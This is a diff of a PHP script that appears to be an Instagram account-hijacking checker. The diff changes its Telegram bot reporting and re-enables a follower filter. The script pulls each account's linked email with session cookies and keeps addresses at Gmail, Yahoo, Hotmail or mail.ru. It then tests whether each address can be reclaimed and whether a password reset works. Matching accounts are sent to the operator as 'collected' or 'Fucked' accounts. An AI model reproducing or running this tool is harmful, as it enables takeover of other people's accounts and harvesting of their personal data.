@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 date_default_timezone_set('Asia/Baghdad');
 $config = json_decode(file_get_contents('config.json'),1);
 $id = $config['id'];
@@ -21,70 +21,30 @@ $yahoo = 0;
 $mailru = 0;
 $true = 0;
 $false = 0;
-$edit = bot('sendMessage',[
-    'chat_id'=>$id,
-    'text'=>"- *Status:*",
-    'parse_mode'=>'markdown',
-    'reply_markup'=>json_encode([
-            'inline_keyboard'=>[
-                [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
-                [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
-                [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
-                [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
-                [['text'=>'True: '.$true,'callback_data'=>'gj']],
-                [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
-            ]
-        ])
-]);
-$se = 100;
-$editAfter = 50;
 foreach ($users as $user) {
     $info = getInfo($user, $cookies, $useragent);
     if ($info != false ) {
         $mail = trim($info['mail']);
         $usern = $info['user'];
         $e = explode('@', $mail);
-        if (preg_match('/(live|hotmail|outlook|yahoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
+               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
             echo 'check ' . $mail . PHP_EOL;
                     if(checkMail($mail)){
                         $inInsta = inInsta($mail);
                         if ($inInsta !== false) {
-                            // if($config['filter'] <= $follow){
+                             if($config['filter'] <= $follow){
                                 echo "True - $user - " . $mail . "\n";
-                                if(strpos($mail, 'gmail.com')){
-                                    $gmail += 1;
-                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
-                                    $hotmail += 1;
-                                } elseif(strpos($mail, 'yahoo')){
-                                    $yahoo += 1;
-                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
-                                    $mailru += 1;
-                                }
                                 $follow = $info['f'];
                                 $following = $info['ff'];
                                 $media = $info['m'];
-                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "Hi i Fucked New Account ✅\n━━━━━━━━━━━━\n.❖. UserName : [$usern](instagram.com/$usern)\n.❖. Email : [$mail]\n. Followers : $follow\n.❖. Following : $following\n.❖. PoSt : $media\n━━━━━━━━━━━━\nCH :- [@Corup]",
+                                bot('sendMessage',['chat_id' => $id, 'text' => "New Account Collected \n\nUser : [$usern\nEmail - $mail\nFollowers : $follow\nFollowing : $following\nPosts : $media\n\n- BY @i_BRK - @x_BRK",
                                 
                                 'parse_mode'=>'markdown']);
                                 
-                                bot('editMessageReplyMarkup',[
-                                    'chat_id'=>$id,
-                                    'message_id'=>$edit->result->message_id,
-                                    'reply_markup'=>json_encode([
-                                        'inline_keyboard'=>[
-                                            [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
-                                            [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
-                                            [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
-                                            [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
-                                            [['text'=>'True: '.$true,'callback_data'=>'gj']],
-                                            [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
-                                        ]
-                                    ])
-                                ]);
-                                $true += 1;
-                            // } else {
-                            //     echo "Filter , ".$mail.PHP_EOL;
-                            // }
+                            
+                             } else {
+                               echo "Filter , ".$mail.PHP_EOL;
+                             }
                             
                         } else {
                           echo "No Rest $mail\n";
@@ -100,23 +60,5 @@ foreach ($users as $user) {
     }
     usleep(750000);
     $i++;
-    if($i == $editAfter){
-        bot('editMessageReplyMarkup',[
-            'chat_id'=>$id,
-            'message_id'=>$edit->result->message_id,
-            'reply_markup'=>json_encode([
-                'inline_keyboard'=>[
-                    [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
-                    [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
-                    [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
-                    [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
-                    [['text'=>'True: '.$true,'callback_data'=>'gj']],
-                    [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
-                ]
-            ])
-        ]);
-        $editAfter += 50;
-    }
 }
-bot('sendMessage', ['chat_id' => $id, 'text' =>"انتهى الفحص : ".explode(':',$screen)[0]]);
-
+bot('sendMessage', ['chat_id' => $id, 'text' =>"Checked Done - ".explode(':',$screen)[0]]);
